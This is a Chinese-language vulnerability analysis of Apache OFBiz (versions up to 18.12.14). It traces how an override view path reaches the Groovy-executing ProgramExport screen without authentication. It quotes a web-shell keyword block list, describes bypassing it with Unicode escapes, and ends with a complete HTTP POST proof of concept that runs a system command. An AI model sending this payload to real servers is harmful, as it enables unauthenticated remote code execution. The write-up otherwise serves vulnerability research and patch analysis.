#ofbiz
## 影响范围
-  # Apache OFBiz <= 18.12.14
## 漏洞分析

ofbiz对路由和请求的处理都集中在`org/apache/ofbiz/webapp/control/ControlServlet.java`中的`doGet`方法，在前面的request初始化完成后，通过对`RequestHandler`的处理来完成请求处理

```JAVA
try {  
    // the ServerHitBin call for the event is done inside the doRequest method  
    handler.doRequest(request, response, null, userLogin, delegator);
```

进入到`RequestHandler#doRequest`方法，其中获取xml配置使用

```JAVA
// Parse controller config.  
try {  
    ccfg = new ControllerConfig(getControllerConfig());  
} catch (WebAppConfigurationException e) {  
    Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);  
    throw new RequestHandlerException(e);  
}


public ConfigXMLReader.ControllerConfig getControllerConfig() {  
    try {  
        return ConfigXMLReader.getControllerConfig(this.controllerConfigURL);  
    } catch (WebAppConfigurationException e) {  
        // FIXME: controller.xml errors should throw an exception.  
        Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);  
    }  
    return null;  
}
```


接下来进入对参数chain的判断，由于初始chain为NULL，代码直接进入else，跳过前面一系列对证书的校验等处理

```JAVA
if(chain != null) {
	......
} else {
	......
	// Invoke the pre-processor (but NOT in a chain)
	for (ConfigXMLReader.Event event: ccfg.getPreprocessorEventList().values()) {  
	    try {  
	        String returnString = this.runEvent(request, response, event, null, "preprocessor");  
	        if (returnString == null || "none".equalsIgnoreCase(returnString)) {  
            interruptRequest = true;  
	        } else if (!"success".equalsIgnoreCase(returnString)) {  
	            if (!returnString.contains(":_protect_:")) {  
	                throw new EventHandlerException("Pre-Processor event [" + event.invoke + "] did not return 'success'.");  
	            } else { // protect the view normally rendered and redirect to error response view  
	                returnString = returnString.replace(":_protect_:", "");  
	                if (returnString.length() > 0) {  
	                    request.setAttribute("_ERROR_MESSAGE_", returnString);  
	                }  
	                eventReturn = null;  
	                // check to see if there is a "protect" response, if so it's ok else show the default_error_response_view  
	                if (!requestMap.requestResponseMap.containsKey("protect")) {  
	                    if (ccfg.getProtectView() != null) {  
	                        overrideViewUri = ccfg.getProtectView();  
	                    } else {  
	                        overrideViewUri = EntityUtilProperties.getPropertyValue("security", "default.error.response.view", delegator);  
	                        overrideViewUri = overrideViewUri.replace("view:", "");  
	                        if ("none:".equals(overrideViewUri)) {  
	                            interruptRequest = true;  
	                        }  
	                    }  
	                }  
	            }  
	        }  
	    }
	} catch (EventHandlerException e) {  
            Debug.logError(e, module);  
        }  
    }  
}
```


完成各类event的预处理后，进入登录的检测

```JAVA
// Perform security check.  
if (requestMap.securityAuth) {  
    // Invoke the security handler  
    // catch exceptions and throw RequestHandlerException if failed.    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler]: AuthRequired. Running security check. " + showSessionId(request), module);  
    ConfigXMLReader.Event checkLoginEvent = ccfg.getRequestMapMap().getFirst("checkLogin").event;  
    String checkLoginReturnString = null;  
  
    try {  
        checkLoginReturnString = this.runEvent(request, response, checkLoginEvent, null, "security-auth");  
    } catch (EventHandlerException e) {  
        throw new RequestHandlerException(e.getMessage(), e);  
    }  
    if (!"success".equalsIgnoreCase(checkLoginReturnString)) {  
        // previous URL already saved by event, so just do as the return says...  
        eventReturn = checkLoginReturnString;  
        // if the request is an ajax request we don't want to return the default login check  
        if (!"XMLHttpRequest".equals(request.getHeader("X-Requested-With"))) {  
            requestMap = ccfg.getRequestMapMap().getFirst("checkLogin");  
        } else {  
            requestMap = ccfg.getRequestMapMap().getFirst("ajaxCheckLogin");  
        }  
    }  
} else if (requestUri != null) {  
    String[] loginUris = EntityUtilProperties.getPropertyValue("security", "login.uris", delegator).split(",");  
    boolean removePreviousRequest = true;  
    for (int i = 0; i < loginUris.length; i++) {  
        if (requestUri.equals(loginUris[i])) {  
            removePreviousRequest = false;  
        }  
    }  
    if (removePreviousRequest) {  
        // Remove previous request attribute on navigation to non-authenticated request  
        request.getSession().removeAttribute("_PREVIOUS_REQUEST_");  
    }  
}
```

这里调用的checkLogin的event，从对应的XML文件中可以确定,其调用的`org.apache.ofbiz.webapp.control.LoginWorker`

```XML
<request-map uri="checkLogin">  
    <description>Verify a user is logged in.</description>  
    <security https="true" auth="false"/>  
    <event type="java" path="org.apache.ofbiz.webapp.control.LoginWorker" invoke="extensionCheckLogin"/>  
    <response name="success" type="view" value="main"/>  
    <response name="impersonated" type="view" value="impersonated"/>  
    <response name="error" type="view" value="login"/>  
</request-map>
```

```JAVA
public static String extensionCheckLogin(HttpServletRequest request, HttpServletResponse response) {  
    for (LoginCheck check: ServiceLoader.load(LoginCheck.class)) {  
        if (!check.isEnabled()) {  
            continue;  
        }  
        String result = check.associate(request, response);  
        if (result != null) {  
            return result;  
        }  
    }  
    return checkLogin(request, response);  
}
```

接着往下调用event

```JAVA
// Invoke the defined event (unless login failed)  
if (eventReturn == null && requestMap.event != null) {  
    if (requestMap.event.type != null && requestMap.event.path != null && requestMap.event.invoke != null) {  
        try {  
            long eventStartTime = System.currentTimeMillis();  
  
            // run the request event  
            eventReturn = this.runEvent(request, response, requestMap.event, requestMap, "request");  
  
            if (requestMap.event.metrics != null) {  
                requestMap.event.metrics.recordServiceRate(1, System.currentTimeMillis() - startTime);  
            }  
  
            // save the server hit for the request event  
            if (this.trackStats(request)) {  
                ServerHitBin.countEvent(cname + "." + requestMap.event.invoke, request, eventStartTime,  
                        System.currentTimeMillis() - eventStartTime, userLogin);  
            }  
  
            // set the default event return  
            if (eventReturn == null) {  
                nextRequestResponse = ConfigXMLReader.emptyNoneRequestResponse;  
            }  
        } catch (EventHandlerException e) {  
            // check to see if there is an "error" response, if so go there and make an request error message  
            if (requestMap.requestResponseMap.containsKey("error")) {  
                eventReturn = "error";  
                Locale locale = UtilHttp.getLocale(request);  
                String errMsg = UtilProperties.getMessage("WebappUiLabels", "requestHandler.error_call_event", locale);  
                request.setAttribute("_ERROR_MESSAGE_", errMsg + ": " + e.toString());  
            } else {  
                throw new RequestHandlerException("Error calling event and no error response was specified", e);  
            }  
        }  
    }  
}
```

如果登录成功后会开始对对应view的处理

```JAVA
// Set the next view (don't use event return if success, default to nextView (which is set to eventReturn later if null); also even if success if it is a type "none" response ignore the nextView, ie use the eventReturn)  
if (eventReturnBasedRequestResponse != null && (!"success".equals(eventReturnBasedRequestResponse.name) || "none".equals(eventReturnBasedRequestResponse.type))) nextRequestResponse = eventReturnBasedRequestResponse;  
  
// get the previous request info  
String previousRequest = (String) request.getSession().getAttribute("_PREVIOUS_REQUEST_");  
String loginPass = (String) request.getAttribute("_LOGIN_PASSED_");  
  
// restore previous redirected request's attribute, so redirected page can display previous request's error msg etc.  
String preReqAttStr = (String) request.getSession().getAttribute("_REQ_ATTR_MAP_");  
if (preReqAttStr != null) {  
    request.getSession().removeAttribute("_REQ_ATTR_MAP_");  
    byte[] reqAttrMapBytes = StringUtil.fromHexString(preReqAttStr);  
    Map<String, Object> preRequestMap = checkMap(UtilObject.getObject(reqAttrMapBytes), String.class, Object.class);  
    if (UtilValidate.isNotEmpty(preRequestMap)) {  
        for (Map.Entry<String, Object> entry: preRequestMap.entrySet()) {  
            String key = entry.getKey();  
            if ("_ERROR_MESSAGE_LIST_".equals(key) || "_ERROR_MESSAGE_MAP_".equals(key) || "_ERROR_MESSAGE_".equals(key) ||  
                    "_EVENT_MESSAGE_LIST_".equals(key) || "_EVENT_MESSAGE_".equals(key)) {  
                request.setAttribute(key, entry.getValue());  
           }  
        }  
    }  
}
ConfigXMLReader.RequestResponse successResponse = requestMap.requestResponseMap.get("success");  
if ((eventReturn == null || "success".equals(eventReturn)) && successResponse != null && "request".equals(successResponse.type)) {  
    // chains will override any url defined views; but we will save the view for the very end  
    if (UtilValidate.isNotEmpty(overrideViewUri)) {  
        request.setAttribute("_POST_CHAIN_VIEW_", overrideViewUri);  
    }  
    nextRequestResponse = successResponse;  
}
```

接下来从717行到816行代码都是基于对url的判断来选择视图类型

```JAVA
if ("url".equals(nextRequestResponse.type)) {  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a URL redirect." + showSessionId(request), module);  
    callRedirect(nextRequestResponse.value, response, request, ccfg.getStatusCodeString());  
} else if ("url-redirect".equals(nextRequestResponse.type)) {  
    // check for a cross-application redirect  
    if (Debug.verboseOn())  
        Debug.logVerbose("[RequestHandler.doRequest]: Response is a URL redirect with redirect parameters."  
                + showSessionId(request), module);  
    callRedirect(nextRequestResponse.value + this.makeQueryString(request, nextRequestResponse), response,  
            request, ccfg.getStatusCodeString());  
} else if ("cross-redirect".equals(nextRequestResponse.type)) {  
    // check for a cross-application redirect  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a Cross-Application redirect." + showSessionId(request), module);  
    String url = nextRequestResponse.value.startsWith("/") ? nextRequestResponse.value : "/" + nextRequestResponse.value;  
    callRedirect(url + this.makeQueryString(request, nextRequestResponse), response, request, ccfg.getStatusCodeString());  
} else if ("request-redirect".equals(nextRequestResponse.type)) {  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a Request redirect." + showSessionId(request), module);  
    callRedirect(makeLinkWithQueryString(request, response, "/" + nextRequestResponse.value, nextRequestResponse), response, request, ccfg.getStatusCodeString());  
} else if ("request-redirect-noparam".equals(nextRequestResponse.type)) {  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a Request redirect with no parameters." + showSessionId(request), module);  
    callRedirect(makeLink(request, response, nextRequestResponse.value), response, request, ccfg.getStatusCodeString());  
} else if ("view".equals(nextRequestResponse.type)) {  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a view." + showSessionId(request), module);  
  
    // check for an override view, only used if "success" = eventReturn  
    String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;  
    renderView(viewName, requestMap.securityExternalView, request, response, saveName);  
} else if ("view-last".equals(nextRequestResponse.type)) {  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a view." + showSessionId(request), module);  
  
    // check for an override view, only used if "success" = eventReturn  
    String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;  
  
    // as a further override, look for the _SAVED and then _HOME and then _LAST session attributes  
    Map<String, Object> urlParams = null;  
    if (session.getAttribute("_SAVED_VIEW_NAME_") != null) {  
        viewName = (String) session.getAttribute("_SAVED_VIEW_NAME_");  
        urlParams = UtilGenerics.<String, Object>checkMap(session.getAttribute("_SAVED_VIEW_PARAMS_"));  
    } else if (session.getAttribute("_HOME_VIEW_NAME_") != null) {  
        viewName = (String) session.getAttribute("_HOME_VIEW_NAME_");  
        urlParams = UtilGenerics.<String, Object>checkMap(session.getAttribute("_HOME_VIEW_PARAMS_"));  
    } else if (session.getAttribute("_LAST_VIEW_NAME_") != null) {  
        viewName = (String) session.getAttribute("_LAST_VIEW_NAME_");  
        urlParams = UtilGenerics.<String, Object>checkMap(session.getAttribute("_LAST_VIEW_PARAMS_"));  
    } else if (UtilValidate.isNotEmpty(nextRequestResponse.value)) {  
        viewName = nextRequestResponse.value;  
    }  
    if (UtilValidate.isEmpty(viewName) && UtilValidate.isNotEmpty(nextRequestResponse.value)) {  
        viewName = nextRequestResponse.value;  
    }  
    if (urlParams != null) {  
        for (Map.Entry<String, Object> urlParamEntry: urlParams.entrySet()) {  
            String key = urlParamEntry.getKey();  
            // Don't overwrite messages coming from the current event  
            if (!("_EVENT_MESSAGE_".equals(key) || "_ERROR_MESSAGE_".equals(key)  
                    || "_EVENT_MESSAGE_LIST_".equals(key) || "_ERROR_MESSAGE_LIST_".equals(key))) {  
                request.setAttribute(key, urlParamEntry.getValue());  
            }  
        }  
    }  
    renderView(viewName, requestMap.securityExternalView, request, response, null);  
} else if ("view-last-noparam".equals(nextRequestResponse.type)) {  
     if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a view." + showSessionId(request), module);  
  
     // check for an override view, only used if "success" = eventReturn  
     String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;  
  
     // as a further override, look for the _SAVED and then _HOME and then _LAST session attributes  
     if (session.getAttribute("_SAVED_VIEW_NAME_") != null) {  
         viewName = (String) session.getAttribute("_SAVED_VIEW_NAME_");  
     } else if (session.getAttribute("_HOME_VIEW_NAME_") != null) {  
         viewName = (String) session.getAttribute("_HOME_VIEW_NAME_");  
     } else if (session.getAttribute("_LAST_VIEW_NAME_") != null) {  
         viewName = (String) session.getAttribute("_LAST_VIEW_NAME_");  
     } else if (UtilValidate.isNotEmpty(nextRequestResponse.value)) {  
         viewName = nextRequestResponse.value;  
     }  
     renderView(viewName, requestMap.securityExternalView, request, response, null);  
} else if ("view-home".equals(nextRequestResponse.type)) {  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a view." + showSessionId(request), module);  
  
    // check for an override view, only used if "success" = eventReturn  
    String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;  
  
    // as a further override, look for the _HOME session attributes  
    Map<String, Object> urlParams = null;  
    if (session.getAttribute("_HOME_VIEW_NAME_") != null) {  
        viewName = (String) session.getAttribute("_HOME_VIEW_NAME_");  
        urlParams = UtilGenerics.<String, Object>checkMap(session.getAttribute("_HOME_VIEW_PARAMS_"));  
    }  
    if (urlParams != null) {  
        for (Map.Entry<String, Object> urlParamEntry: urlParams.entrySet()) {  
            request.setAttribute(urlParamEntry.getKey(), urlParamEntry.getValue());  
        }  
    }  
    renderView(viewName, requestMap.securityExternalView, request, response, null);  
} else if ("none".equals(nextRequestResponse.type)) {  
    // no view to render (meaning the return was processed by the event)  
    if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is handled by the event." + showSessionId(request), module);  
}
```

这里是url为login时的视图

```XML
<request-map uri="login">  
    <security https="true" auth="false"/>  
    <event type="java" path="org.apache.ofbiz.webapp.control.LoginWorker" invoke="login"/>  
    <response name="success" type="view" value="main"/>  
    <response name="requirePasswordChange" type="view" value="requirePasswordChange"/>  
    <response name="error" type="view" value="login"/>  
</request-map>
```

视图返回会调用`renderView`

```JAVA
private void renderView(String view, boolean allowExtView, HttpServletRequest req, HttpServletResponse resp, String saveName) throws RequestHandlerException {  
    ......
    ConfigXMLReader.ViewMap viewMap = null;  
    try {  
        viewMap = (view == null ? null : getControllerConfig().getViewMapMap().get(view));  
    } catch (WebAppConfigurationException e) {  
        Debug.logError(e, "Exception thrown while parsing controller.xml file: ", module);  
        throw new RequestHandlerException(e);  
    }  
    if (viewMap == null) {  
        throw new RequestHandlerException("No definition found for view with name [" + view + "]");  
    }
    String nextPage;  
  
	if (viewMap.page == null) {  
	    if (!allowExtView) {  
	        throw new RequestHandlerException("No view to render.");  
	    } else {  
	        nextPage = "/" + oldView;  
	    }  
	} else {  
	    nextPage = viewMap.page;  
	}
	......
	//Security Headers  
	UtilHttp.setResponseBrowserDefaultSecurityHeaders(resp, viewMap);  
  
	try {  
	    if (Debug.verboseOn()) Debug.logVerbose("Rendering view [" + nextPage + "] of type [" + viewMap.type + "]", module);  
	    ViewHandler vh = viewFactory.getViewHandler(viewMap.type);  
	    vh.render(view, nextPage, viewMap.info, contentType, charset, req, resp);  
	} catch (ViewHandlerException e) {  
	    Throwable throwable = e.getNested() != null ? e.getNested() : e;  
	    throw new RequestHandlerException(e.getNonNestedMessage(), throwable);  
	}
	......
}
```

## 漏洞点分析

主要问题出现在`org/apache/ofbiz/webapp/control/RequestHandler.java`第748行,`overrideViewUri`取的是path第二个/以后的所有值,所以只要将`requestUri`设置为type为view且无需鉴权的路由，而overrideViewUri设置为恶意的利用路由

```JAVA
String path = request.getPathInfo();  
String requestUri = getRequestUri(path);  
String overrideViewUri = getOverrideViewUri(path);
```

```JAVA
String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;
```

在controller.xml中,`ProgramExport`value是一致的

```XML
<request-map uri="ProgramExport">  
    <security https="true" auth="true"/>  
    <response name="success" type="view" value="ProgramExport"/>  
    <response name="error" type="view" value="ProgramExport"/>  
</request-map>
```

`EntityScreens.xml`并执行对应的groovy`component://webtools/groovyScripts/entity/ProgramExport.groovy`

```XML
<screen name="ProgramExport">  
    <section>        
	    <actions>            
		    <set field="titleProperty" value="PageTitleEntityExportAll"/>  
            <set field="tabButtonItem" value="programExport"/>  
            <script location="component://webtools/groovyScripts/entity/ProgramExport.groovy"/>  
        </actions>        
        <widgets>            
	        <decorator-screen name="CommonImportExportDecorator" location="${parameters.mainDecoratorLocation}">  
	            <decorator-section name="body">  
                     <screenlet>                        
	                     <include-form name="ProgramExport" location="component://webtools/widget/MiscForms.xml"/>  
                    </screenlet>                    
                    <screenlet>                        
	                    <platform-specific>                            
		                    <html>
			                    <html-template location="component://webtools/template/entity/ProgramExport.ftl"/>
			                </html>  
                        </platform-specific>                    
                    </screenlet>                
                </decorator-section>            
            </decorator-screen>        
        </widgets>    
    </section>
</screen>
```


且这里的参数`groovyProgram`可控，就可以直接用Groovy脚本执行命令

```JAVA
String groovyProgram = null  
recordValues = []  
errMsgList = []  
  
if (!parameters.groovyProgram) {  
    groovyProgram = '''  
// Use the List variable recordValues to fill it with GenericValue maps.  
// full groovy syntaxt is available  
  
import org.apache.ofbiz.entity.util.EntityFindOptions  
  
// example:  
  
// find the first three record in the product entity (if any)  
EntityFindOptions findOptions = new EntityFindOptions()  
findOptions.setMaxRows(3)  
  
List products = delegator.findList("Product", null, null, null, findOptions, false)  
if (products != null) {  
    recordValues.addAll(products)}  
  
  
'''  
    parameters.groovyProgram = groovyProgram  
} else {  
    groovyProgram = parameters.groovyProgram  
}  
  
// Add imports for script.  
def importCustomizer = new ImportCustomizer()  
importCustomizer.addImport("org.apache.ofbiz.entity.GenericValue")  
importCustomizer.addImport("org.apache.ofbiz.entity.model.ModelEntity")  
def configuration = new CompilerConfiguration()  
configuration.addCompilationCustomizers(importCustomizer)  
  
Binding binding = new Binding()  
binding.setVariable("delegator", delegator)  
binding.setVariable("recordValues", recordValues)  
  
ClassLoader loader = Thread.currentThread().getContextClassLoader()  
def shell = new GroovyShell(loader, binding, configuration)  
  
if (UtilValidate.isNotEmpty(groovyProgram)) {  
    try {  
        // Check if a webshell is not uploaded but allow "import"  
        if (!SecuredUpload.isValidText(groovyProgram, ["import"])) {  
            logError("================== Not executed for security reason ==================")  
            request.setAttribute("_ERROR_MESSAGE_", "Not executed for security reason")  
            return  
        }  
        shell.parse(groovyProgram)  
        shell.evaluate(groovyProgram)  
        recordValues = shell.getVariable("recordValues")  
        xmlDoc = GenericValue.makeXmlDocument(recordValues)  
        context.put("xmlDoc", xmlDoc)  
    } catch(MultipleCompilationErrorsException e) {  
        request.setAttribute("_ERROR_MESSAGE_", e)  
        return  
    } catch(groovy.lang.MissingPropertyException e) {  
        request.setAttribute("_ERROR_MESSAGE_", e)  
        return  
    } catch(IllegalArgumentException e) {  
        request.setAttribute("_ERROR_MESSAGE_", e)  
        return  
    } catch(NullPointerException e) {  
        request.setAttribute("_ERROR_MESSAGE_", e)  
        return  
    } catch(Exception e) {  
        request.setAttribute("_ERROR_MESSAGE_", e)  
        return  
    }  
}
```

Ofbiz限制了一些关键词的使用，可以利用Unicode编码来绕过

```JAVA
deniedWebShellTokens=java.,beans,freemarker,<script,javascript,<body,body ,<form,<jsp:,<c:out,taglib,<prefix,<%@ page,<?php,exec(,alert(,\  
                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\  
                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\  
                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\  
                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,"cmd",*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\  
                     execute,println,calc,touch,calculate
```

## POC

```burp
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Length: 190

------WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Disposition: form-data; name="groovyProgram"

throw new Exception('id'.\u0065xecute().text);
------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--
```